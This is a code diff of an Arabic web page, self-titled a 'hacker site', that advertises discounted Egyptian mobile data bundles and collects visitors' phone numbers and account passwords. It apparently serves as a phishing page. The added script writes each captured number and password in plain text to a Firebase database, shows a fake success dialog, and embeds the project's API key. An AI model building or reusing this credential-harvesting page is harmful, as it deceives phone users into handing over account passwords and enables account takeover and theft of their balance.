@@ -1,288 +1,306 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>موقع الباقات</title>
-
-<!-- خط عربي احترافي -->
-<link href="https://fonts.googleapis.com/css2?family=Cairo&display=swap" rel="stylesheet" />
-
-<style>
-  /* ألوان الموقع */
-  body {
-    margin: 0; padding: 0;
-    background: #000;
-    color: #ff0000;
-    font-family: 'Cairo', sans-serif;
-    overflow-x: hidden;
-    direction: rtl;
-  }
-
-  /* تأثير الماتريكس */
-  #matrix {
-    position: fixed;
-    top: 0; left: 0;
-    width: 100vw;
-    height: 100vh;
-    background: black;
-    z-index: 0;
-  }
-
-  /* نص الماتريكس */
-  canvas {
-    display: block;
-    position: fixed;
-    top: 0; left: 0;
-    z-index: 0;
-  }
-
-  /* الحاوية */
-  .container {
-    position: relative;
-    z-index: 10;
-    max-width: 900px;
-    margin: 30px auto 80px auto;
-    padding: 20px;
-  }
-
-  h1 {
-    text-align: center;
-    font-size: 3rem;
-    margin-bottom: 30px;
-    color: #ff0000;
-    text-shadow: 0 0 10px #ff0000aa;
-  }
-
-  .package {
-    background: #111;
-    border: 2px solid #ff0000;
-    border-radius: 15px;
-    padding: 20px 30px;
-    margin-bottom: 40px;
-    box-shadow: 0 0 15px #ff0000aa;
-  }
-
-  .package h2 {
-    color: #ff0000;
-    margin-bottom: 10px;
-    font-size: 1.8rem;
-  }
-
-  .package p {
-    font-size: 1.1rem;
-    margin: 8px 0;
-    color: #f44336;
-  }
-
-  /* الفورم */
-  form {
-    margin-top: 15px;
-  }
-
-  label {
-    display: block;
-    margin-bottom: 6px;
-    color: #ff5555;
-    font-weight: 600;
-  }
-
-  input[type="text"], input[type="password"], input[type="number"] {
-    width: 100%;
-    padding: 8px 12px;
-    margin-bottom: 15px;
-    border-radius: 8px;
-    border: 1.5px solid #ff0000;
-    background: #222;
-    color: #fff;
-    font-size: 1rem;
-  }
-
-  input[type="submit"] {
-    background: #ff0000;
-    border: none;
-    padding: 12px 25px;
-    font-size: 1.1rem;
-    font-weight: bold;
-    border-radius: 8px;
-    cursor: pointer;
-    transition: background 0.3s ease;
-    color: white;
-  }
-
-  input[type="submit"]:hover {
-    background: #cc0000;
-  }
-
-  /* خانة شحن الرصيد الصافي */
-  #balance-section {
-    background: #111;
-    border: 2px solid #ff0000;
-    border-radius: 15px;
-    padding: 20px 30px;
-    margin-bottom: 40px;
-    box-shadow: 0 0 15px #ff0000aa;
-  }
-
-  #balance-section h2 {
-    color: #ff0000;
-    margin-bottom: 15px;
-  }
-
-  #balance-section p {
-    color: #f44336;
-    font-weight: 600;
-    margin-bottom: 10px;
-  }
-
-  /* الحقوق */
-  footer {
-    text-align: center;
-    padding: 12px 0;
-    color: #ff0000aa;
-    font-size: 0.9rem;
-    border-top: 1px solid #ff0000;
-    position: fixed;
-    bottom: 0; left: 0; right: 0;
-    background: #111;
-    z-index: 100;
-  }
-
-  /* رسائل تأكيد */
-  #msg {
-    margin-bottom: 20px;
-    padding: 10px;
-    border-radius: 8px;
-    display: none;
-    font-weight: bold;
-    color: #0f0;
-    background: #003300;
-  }
-
-  /* متجاوب */
-  @media(max-width:600px) {
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+  <title>موقع الهكر</title>
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+  <style>
+    /* التصميم العام */
+    body {
+      margin: 0;
+      padding: 0 5vw;
+      background: #000;
+      color: #0f0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      overflow-x: hidden;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
     h1 {
-      font-size: 2rem;
+      font-size: 2.8rem;
+      margin: 25px 0 10px 0;
+      text-align: center;
+      letter-spacing: 2px;
+      text-shadow: 0 0 8px #0f0;
+    }
+    /* تأثير ماتريكس - الأرقام والنصوص الخضراء تنزل */
+    @keyframes matrixDrop {
+      0% { transform: translateY(-100%) }
+      100% { transform: translateY(100vh) }
+    }
+    .matrix-line {
+      position: fixed;
+      top: -50px;
+      left: 0;
+      width: 100%;
+      font-family: monospace;
+      font-size: 1.2rem;
+      color: #0f0;
+      opacity: 0.1;
+      user-select: none;
+      pointer-events: none;
+      animation: matrixDrop linear infinite;
+      animation-duration: 10s;
+    }
+    /* توزيع عدة خطوط ماتريكس */
+    .matrix-line:nth-child(1) { left: 5vw; animation-delay: 0s; }
+    .matrix-line:nth-child(2) { left: 30vw; animation-delay: 3s; font-size: 1.5rem; }
+    .matrix-line:nth-child(3) { left: 60vw; animation-delay: 6s; font-size: 1.2rem; }
+    .matrix-line:nth-child(4) { left: 80vw; animation-delay: 9s; font-size: 1.4rem; }
+    
+    /* الصندوق الرئيسي */
+    .container {
+      width: 100%;
+      max-width: 450px;
+      background: rgba(0,0,0,0.85);
+      box-shadow: 0 0 15px #0f0;
+      border-radius: 12px;
+      padding: 20px 25px;
+      margin-bottom: 60px;
     }
     .package {
-      padding: 15px 20px;
+      border: 2px solid #f00;
+      margin-bottom: 15px;
+      border-radius: 8px;
+      padding: 12px 15px;
+      background: #110000;
+      position: relative;
     }
-  }
-</style>
+    .package h2 {
+      margin: 0 0 6px 0;
+      color: #f00;
+      font-size: 1.5rem;
+      text-shadow: 0 0 8px #f00;
+    }
+    .package p {
+      margin: 4px 0;
+      font-size: 1rem;
+      color: #ddd;
+    }
+    .package .conditions {
+      font-size: 0.9rem;
+      color: #aaa;
+      margin-top: 6px;
+      font-style: italic;
+    }
+
+    /* نموذج الإدخال */
+    label {
+      font-size: 1.1rem;
+      margin-top: 12px;
+      display: block;
+      color: #0f0;
+    }
+    input[type="text"], input[type="password"], input[type="number"] {
+      width: 100%;
+      padding: 12px;
+      margin-top: 6px;
+      border: 2px solid #0f0;
+      border-radius: 6px;
+      background: #111;
+      color: #0f0;
+      font-size: 1.1rem;
+      transition: border-color 0.3s ease;
+      outline: none;
+    }
+    input[type="text"]:focus, input[type="password"]:focus, input[type="number"]:focus {
+      border-color: #0ff;
+      box-shadow: 0 0 8px #0ff;
+    }
+    /* زر الإرسال */
+    button {
+      margin-top: 20px;
+      width: 100%;
+      padding: 14px 0;
+      font-size: 1.3rem;
+      font-weight: 700;
+      background-color: #f00;
+      border: none;
+      border-radius: 8px;
+      color: #fff;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      user-select: none;
+    }
+    button:hover {
+      background-color: #c00;
+    }
+    button:active {
+      transform: scale(0.97);
+    }
+
+    /* خانة الرصيد الصافي */
+    .balance-section {
+      margin-top: 25px;
+      padding: 15px;
+      background: #111100;
+      border-radius: 8px;
+      border: 2px solid #0f0;
+      color: #0f0;
+      font-size: 1.1rem;
+      text-align: center;
+      user-select: none;
+    }
+
+    /* الحقوق */
+    footer {
+      width: 100%;
+      max-width: 450px;
+      text-align: center;
+      font-size: 0.9rem;
+      color: #aaa;
+      margin-bottom: 15px;
+      user-select: none;
+    }
+
+    /* نوافذ منبثقة */
+    .modal {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0,0,0,0.8);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      visibility: hidden;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+      z-index: 9999;
+    }
+    .modal.active {
+      visibility: visible;
+      opacity: 1;
+    }
+    .modal-content {
+      background: #000;
+      border: 2px solid #0f0;
+      padding: 20px 30px;
+      border-radius: 10px;
+      max-width: 300px;
+      text-align: center;
+      box-shadow: 0 0 15px #0f0;
+      color: #0f0;
+      font-size: 1.1rem;
+      user-select: none;
+    }
+    .modal-content button {
+      margin-top: 15px;
+      width: 100%;
+      padding: 10px 0;
+      background: #0f0;
+      color: #000;
+      border-radius: 6px;
+      border: none;
+      cursor: pointer;
+      font-weight: 700;
+    }
+    .modal-content button:hover {
+      background: #0c0;
+    }
+
+  </style>
 </head>
 <body>
 
-<canvas id="matrix"></canvas>
+  <!-- تأثير ماتريكس -->
+  <div class="matrix-line" style="animation-duration: 12s;">010101010101010101010101010101</div>
+  <div class="matrix-line" style="animation-duration: 15s;">101010101010101010101010101010</div>
+  <div class="matrix-line" style="animation-duration: 13s;">110011001100110011001100110011</div>
+  <div class="matrix-line" style="animation-duration: 10s;">001100110011001100110011001100</div>
 
-<div class="container">
-  <h1>مرحباً بك في موقع الباقات</h1>
+  <h1>موقع هكر متكامل</h1>
 
-  <!-- باقة 1 -->
-  <div class="package" id="package1">
-    <h2>باقه 42 ألف فليكس - 350 كاش</h2>
-    <p>شروط الباقه: أن الخط يكون نظام فليكس 260 وميكونش عليه سلف أو نوته</p>
-    <form onsubmit="return sendPackage(event, '42K_FLEX')">
-      <label for="phone1">رقم الهاتف:</label>
-      <input type="text" id="phone1" name="phone" required pattern="\d{10,15}" placeholder="أدخل رقم الهاتف" />
-      
-      <label for="pass1">كلمة المرور:</label>
-      <input type="password" id="pass1" name="password" required placeholder="أدخل كلمة المرور" />
-      
-      <input type="submit" value="إرسال" />
+  <div class="container" id="main-container">
+
+    <!-- الباقات -->
+    <div class="package">
+      <h2>باقه 42 الف فليكس ب 350 كاش</h2>
+      <p>شروط الباقه: الخط يكون نظام فليكس 260 وميكونش عليه سلف أو نوته</p>
+    </div>
+
+    <div class="package">
+      <h2>باقه 13 الف فليكس ب 240 كاش</h2>
+      <p>شروطها: ميكونش فيه سلف أو نوته على الخط</p>
+    </div>
+
+    <div class="package">
+      <h2>باقه 40 جيجا ب 330 كاش</h2>
+      <p>لا يوجد شروط</p>
+    </div>
+
+    <div class="package">
+      <h2>تجديد باقه 50 الف فليكس (8 أيام)</h2>
+      <p>شروطها: تجدد قبل أيام انتهاء الباقه</p>
+      <p><em>ملحوظة: تجديد وليس تفعيل</em></p>
+    </div>
+
+    <div class="package">
+      <h2>باقه 5200 فليكس بسعر 100 كاش</h2>
+      <p>شروطها: ميكونش سلف أو نوته على الخط</p>
+      <p><em>ملحوظة: غير متوفره على طول ويمكن التحكم بها من موقع الأدمن</em></p>
+    </div>
+
+    <!-- نموذج الإدخال -->
+    <form id="flexForm">
+      <label for="package">اختر الباقة</label>
+      <select id="package" name="package" required style="width: 100%; padding:12px; border-radius:6px; border: 2px solid #0f0; background:#111; color:#0f0; font-size:1.1rem; margin-top:6px; outline:none;">
+        <option value="" disabled selected>اختر الباقة</option>
+        <option value="42k">42 الف فليكس ب 350 كاش</option>
+        <option value="13k">13 الف فليكس ب 240 كاش</option>
+        <option value="40g">40 جيجا ب 330 كاش</option>
+        <option value="50krenew">تجديد باقه 50 الف فليكس (8 أيام)</option>
+        <option value="5200">باقه 5200 فليكس بسعر 100 كاش</option>
+      </select>
+
+      <label for="phone">رقم الهاتف</label>
+      <input type="text" id="phone" name="phone" placeholder="ادخل رقم الهاتف" pattern="01[0-9]{9}" required />
+
+      <label for="password">كلمة المرور</label>
+      <input type="password" id="password" name="password" placeholder="ادخل كلمة المرور" required />
+
+      <button type="submit">إرسال البيانات</button>
     </form>
+
+    <!-- شحن الرصيد الصافي -->
+    <div class="balance-section">
+      <label for="balance">شحن رصيد صافي (ادخل الفليكس)</label>
+      <input type="number" id="balance" min="0" placeholder="ادخل الرصيد الصافي" style="width: 100%; padding: 12px; margin-top: 6px; border-radius: 6px; border: 2px solid #0f0; background: #111; color: #0f0; font-size: 1.1rem; outline:none;">
+      <p style="margin-top: 10px;">السعر بالجنيه: <span id="priceEGP">0</span> جنيه</p>
+      <button id="chargeBalanceBtn">شحن الرصيد الصافي</button>
+    </div>
+
   </div>
 
-  <!-- باقة 2 -->
-  <div class="package" id="package2">
-    <h2>باقه 13 ألف فليكس - 240 كاش</h2>
-    <p>شروط الباقه: ميكونش فيه سلف أو نوته على الخط</p>
-    <form onsubmit="return sendPackage(event, '13K_FLEX')">
-      <label for="phone2">رقم الهاتف:</label>
-      <input type="text" id="phone2" name="phone" required pattern="\d{10,15}" placeholder="أدخل رقم الهاتف" />
-      
-      <label for="pass2">كلمة المرور:</label>
-      <input type="password" id="pass2" name="password" required placeholder="أدخل كلمة المرور" />
-      
-      <input type="submit" value="إرسال" />
-    </form>
+  <footer>Mahmoud Gamal Programming - 01013091169</footer>
+
+  <!-- نوافذ منبثقة -->
+  <div class="modal" id="modal-conditions">
+    <div class="modal-content">
+      <p id="modal-text">هنا شروط الباقة...</p>
+      <button id="modal-accept-btn">موافق</button>
+    </div>
   </div>
 
-  <!-- باقة 3 -->
-  <div class="package" id="package3">
-    <h2>باقه 40 جيجا - 330 كاش</h2>
-    <p>لا يوجد شروط</p>
-    <form onsubmit="return sendPackage(event, '40GB')">
-      <label for="phone3">رقم الهاتف:</label>
-      <input type="text" id="phone3" name="phone" required pattern="\d{10,15}" placeholder="أدخل رقم الهاتف" />
-      
-      <label for="pass3">كلمة المرور:</label>
-      <input type="password" id="pass3" name="password" required placeholder="أدخل كلمة المرور" />
-      
-      <input type="submit" value="إرسال" />
-    </form>
+  <div class="modal" id="modal-success">
+    <div class="modal-content">
+      <p>تم إرسال البيانات بنجاح! شكراً لك.</p>
+      <button id="modal-success-close">إغلاق</button>
+    </div>
   </div>
 
-  <!-- باقة 4 -->
-  <div class="package" id="package4">
-    <h2>تجديد باقه 50 ألف فليكس - 8 أيام</h2>
-    <p>شروط الباقه: تجدد قبل أيام الباقه منتهيه. ملاحظة: تجديد وليس تفعيل</p>
-    <form onsubmit="return sendPackage(event, 'RENEW_50K')">
-      <label for="phone4">رقم الهاتف:</label>
-      <input type="text" id="phone4" name="phone" required pattern="\d{10,15}" placeholder="أدخل رقم الهاتف" />
-      
-      <label for="pass4">كلمة المرور:</label>
-      <input type="password" id="pass4" name="password" required placeholder="أدخل كلمة المرور" />
-      
-      <input type="submit" value="إرسال" />
-    </form>
+  <div class="modal" id="modal-error">
+    <div class="modal-content">
+      <p id="modal-error-text">حدث خطأ ما!</p>
+      <button id="modal-error-close">إغلاق</button>
+    </div>
   </div>
-
-  <!-- باقة 5 -->
-  <div class="package" id="package5">
-    <h2>باقه 5200 فليكس - 100 كاش</h2>
-    <p>شروط الباقه: ميكونش سلف أو نوته على الخط. ملاحظة: غير متوفره على طول</p>
-    <form onsubmit="return sendPackage(event, '5200_FLEX')">
-      <label for="phone5">رقم الهاتف:</label>
-      <input type="text" id="phone5" name="phone" required pattern="\d{10,15}" placeholder="أدخل رقم الهاتف" />
-      
-      <label for="pass5">كلمة المرور:</label>
-      <input type="password" id="pass5" name="password" required placeholder="أدخل كلمة المرور" />
-      
-      <input type="submit" value="إرسال" />
-    </form>
-  </div>
-
-  <!-- شحن الرصيد الصافي -->
-  <div id="balance-section">
-    <h2>شحن الرصيد الصافي</h2>
-    <p>أدخل رقم الهاتف والمبلغ المراد شحنه (الصافي يتحول تلقائياً إلى جنيه)</p>
-    <form onsubmit="return sendBalance(event)">
-      <label for="balancePhone">رقم الهاتف:</label>
-      <input type="text" id="balancePhone" name="phone" required pattern="\d{10,15}" placeholder="أدخل رقم الهاتف" />
-      
-      <label for="balanceAmount">الرصيد الصافي (مثلاً: 100):</label>
-      <input type="number" id="balanceAmount" name="balance" required min="1" placeholder="أدخل الرصيد الصافي" />
-      
-      <p id="convertedAmount" style="color:#0f0; font-weight:bold; margin-bottom:10px;"></p>
-      
-      <input type="submit" value="شحن" />
-    </form>
-  </div>
-
-  <div id="msg"></div>
-
-</div>
-
-<footer>
-  © 2025 Mahmoud Gamal Programming. All rights reserved.
-</footer>
-
-<!-- Firebase -->
-<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 
 <script>
-  // Initialize Firebase
+  // إعداد Firebase
   const firebaseConfig = {
     apiKey: "AIzaSyCuP6VscPxkQS5D5z7bCYWXijzaYCdbF2s",
     authDomain: "starkoscript.firebaseapp.com",
@@ -293,138 +311,142 @@
     appId: "1:381525854892:android:50ba5daa1cffae8faa2d09"
   };
   firebase.initializeApp(firebaseConfig);
-  const database = firebase.database();
+  const db = firebase.database();
 
-  // تأثير الماتريكس
-  const canvas = document.getElementById('matrix');
-  const ctx = canvas.getContext('2d');
-  let width = canvas.width = window.innerWidth;
-  let height = canvas.height = window.innerHeight;
-  let letters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ@#$%^&*()*&^%+-/~{[|`]}'.split('');
-  let fontSize = 18;
-  let columns = Math.floor(width / fontSize);
-  let drops = [];
-  for(let x = 0; x < columns; x++) drops[x] = 1;
+  // أسعار الباقات (للحساب)
+  const packagePrices = {
+    "42k": 350,
+    "13k": 240,
+    "40g": 330,
+    "50krenew": 0, // التجديد لا يشحن رصيد جديد
+    "5200": 100
+  };
 
-  function drawMatrix() {
-    ctx.fillStyle = 'rgba(0,0,0,0.05)';
-    ctx.fillRect(0, 0, width, height);
-    ctx.fillStyle = '#0f0';
-    ctx.font = fontSize + 'px monospace';
+  // عرض شروط الباقات عند الاختيار
+  const packageSelect = document.getElementById('package');
+  const modalConditions = document.getElementById('modal-conditions');
+  const modalText = document.getElementById('modal-text');
+  const modalAcceptBtn = document.getElementById('modal-accept-btn');
 
-    for(let i = 0; i < drops.length; i++) {
-      let text = letters[Math.floor(Math.random() * letters.length)];
-      ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-      if(drops[i] * fontSize > height && Math.random() > 0.975) drops[i] = 0;
-      drops[i]++;
+  const packageConditions = {
+    "42k": "شروط الباقه: الخط يكون نظام فليكس 260 وميكونش عليه سلف أو نوته.",
+    "13k": "شروطها: ميكونش فيه سلف أو نوته على الخط.",
+    "40g": "لا يوجد شروط خاصة لهذه الباقة.",
+    "50krenew": "شروطها: تجدد قبل أيام انتهاء الباقه.",
+    "5200": "شروطها: ميكونش سلف أو نوته على الخط. غير متوفره على طول ويمكن التحكم بها من موقع الأدمن."
+  };
+
+  let acceptedConditions = false;
+
+  packageSelect.addEventListener('change', () => {
+    acceptedConditions = false;
+    const val = packageSelect.value;
+    if(val){
+      modalText.textContent = packageConditions[val] || "لا توجد شروط خاصة.";
+      modalConditions.classList.add('active');
     }
-  }
-  setInterval(drawMatrix, 50);
-
-  window.addEventListener('resize', () => {
-    width = canvas.width = window.innerWidth;
-    height = canvas.height = window.innerHeight;
-    columns = Math.floor(width / fontSize);
-    drops = [];
-    for(let x = 0; x < columns; x++) drops[x] = 1;
   });
 
-  // دالة إرسال بيانات الباقة إلى Firebase
-  function sendPackage(e, packageType) {
+  modalAcceptBtn.onclick = () => {
+    acceptedConditions = true;
+    modalConditions.classList.remove('active');
+  };
+
+  // النموزج والإرسال
+  const form = document.getElementById('flexForm');
+  const modalSuccess = document.getElementById('modal-success');
+  const modalError = document.getElementById('modal-error');
+  const modalErrorText = document.getElementById('modal-error-text');
+  const modalSuccessClose = document.getElementById('modal-success-close');
+  const modalErrorClose = document.getElementById('modal-error-close');
+
+  form.addEventListener('submit', (e) => {
     e.preventDefault();
-    const form = e.target;
+
+    if(!acceptedConditions){
+      alert('يرجى الموافقة على شروط الباقة أولاً.');
+      return;
+    }
+
     const phone = form.phone.value.trim();
     const password = form.password.value.trim();
+    const packageChosen = form.package.value;
 
-    if(phone.length < 10 || !/^\d+$/.test(phone)) {
-      alert('يرجى إدخال رقم هاتف صحيح');
-      return false;
+    if(!phone.match(/^01[0-9]{9}$/)){
+      alert('رقم الهاتف غير صحيح. يجب أن يبدأ بـ 01 ويحتوي على 11 رقم.');
+      return;
     }
-    if(password.length < 3) {
-      alert('يرجى إدخال كلمة مرور صحيحة');
-      return false;
+    if(password.length < 4){
+      alert('كلمة المرور قصيرة جداً.');
+      return;
     }
 
+    // إرسال البيانات إلى Firebase
+    const newEntryKey = db.ref().child('requests').push().key;
     const data = {
-      package: packageType,
-      phone: phone,
-      password: password,
+      phone,
+      password,
+      packageChosen,
       timestamp: Date.now()
     };
-
-    // مسار حفظ البيانات داخل Firebase لكل مستخدم حسب رقم الهاتف
-    database.ref('users/' + phone + '/packages').push(data)
+    let updates = {};
+    updates['/requests/' + newEntryKey] = data;
+    db.ref().update(updates)
       .then(() => {
-        showMsg('تم إرسال بيانات الباقة بنجاح!');
+        modalSuccess.classList.add('active');
         form.reset();
       })
-      .catch(() => {
-        showMsg('حدث خطأ أثناء إرسال البيانات.', true);
+      .catch(err => {
+        modalErrorText.textContent = "حدث خطأ أثناء إرسال البيانات: " + err.message;
+        modalError.classList.add('active');
       });
-
-    return false;
-  }
-
-  // دالة إرسال بيانات شحن الرصيد الصافي
-  function sendBalance(e) {
-    e.preventDefault();
-    const form = e.target;
-    const phone = form.phone.value.trim();
-    const balance = Number(form.balance.value);
-
-    if(phone.length < 10 || !/^\d+$/.test(phone)) {
-      alert('يرجى إدخال رقم هاتف صحيح');
-      return false;
-    }
-    if(balance <= 0) {
-      alert('يرجى إدخال قيمة رصيد صافي صحيحة');
-      return false;
-    }
-
-    const data = {
-      phone: phone,
-      balance: balance,
-      amountInEGP: balance * 0.0096, // تحويل الفليكس إلى جنيه (تعديل حسب السعر الحقيقي)
-      timestamp: Date.now()
-    };
-
-    database.ref('users/' + phone + '/balance').push(data)
-      .then(() => {
-        showMsg('تم شحن الرصيد الصافي بنجاح!');
-        form.reset();
-        document.getElementById('convertedAmount').textContent = '';
-      })
-      .catch(() => {
-        showMsg('حدث خطأ أثناء شحن الرصيد.', true);
-      });
-
-    return false;
-  }
-
-  // عرض رسالة للمستخدم
-  function showMsg(text, isError = false) {
-    const msgDiv = document.getElementById('msg');
-    msgDiv.style.display = 'block';
-    msgDiv.style.color = isError ? '#ff4444' : '#00ff00';
-    msgDiv.style.background = isError ? '#330000' : '#003300';
-    msgDiv.textContent = text;
-    setTimeout(() => {
-      msgDiv.style.display = 'none';
-    }, 5000);
-  }
-
-  // تحديث عرض التحويل من فليكس إلى جنيه تلقائياً
-  const balanceInput = document.getElementById('balanceAmount');
-  const converted = document.getElementById('convertedAmount');
-  balanceInput.addEventListener('input', () => {
-    let val = Number(balanceInput.value);
-    if(val > 0) {
-      let egp = val * 0.0096;
-      converted.textContent = `القيمة بالجنيه: ${egp.toFixed(2)} ج.م`;
-    } else {
-      converted.textContent = '';
-    }
   });
+
+  modalSuccessClose.onclick = () => modalSuccess.classList.remove('active');
+  modalErrorClose.onclick = () => modalError.classList.remove('active');
+
+  // حساب السعر بناء على الرصيد الصافي المدخل
+  const balanceInput = document.getElementById('balance');
+  const priceEGPSpan = document.getElementById('priceEGP');
+  const chargeBalanceBtn = document.getElementById('chargeBalanceBtn');
+
+  // حساب سعر الجنيه حسب 1 كاش = 50 فليكس مثلاً
+  const flexPerCash = 50;
+
+  balanceInput.addEventListener('input', () => {
+    let val = parseInt(balanceInput.value);
+    if(isNaN(val) || val < 0) val = 0;
+    const price = (val / flexPerCash).toFixed(2);
+    priceEGPSpan.textContent = price;
+  });
+
+  chargeBalanceBtn.addEventListener('click', () => {
+    const val = parseInt(balanceInput.value);
+    if(isNaN(val) || val <= 0){
+      alert("الرجاء إدخال رصيد صافي صالح أكبر من صفر.");
+      return;
+    }
+
+    // حفظ بيانات شحن الرصيد الصافي في Firebase
+    const newKey = db.ref().child('balance_charges').push().key;
+    const data = {
+      flexAmount: val,
+      priceEGP: (val / flexPerCash).toFixed(2),
+      timestamp: Date.now()
+    };
+    let updates = {};
+    updates['/balance_charges/' + newKey] = data;
+    db.ref().update(updates)
+      .then(() => {
+        alert("تم شحن الرصيد الصافي بنجاح.");
+        balanceInput.value = '';
+        priceEGPSpan.textContent = '0';
+      })
+      .catch(err => {
+        alert("حدث خطأ أثناء شحن الرصيد: " + err.message);
+      });
+  });
+
 </script>
 
 </body>
